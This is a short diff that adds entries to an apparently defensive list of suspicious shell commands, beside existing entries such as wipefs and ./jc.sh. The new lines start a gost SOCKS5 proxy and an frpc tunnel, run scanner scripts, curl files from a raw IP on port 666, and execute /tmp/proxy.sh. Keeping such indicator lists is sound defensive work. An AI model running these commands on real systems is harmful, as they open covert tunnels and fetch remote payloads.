@@ -298,3 +298,9 @@ wipefs
 ./start
 ./jc.sh
 ./.>_
+./gost -L socks5://:1080
+./frpc -c frpc.toml
+python3 react.py
+python3 scanner.py
+curl -s 67.217.57.240:666/files/*
+bash /tmp/proxy.sh
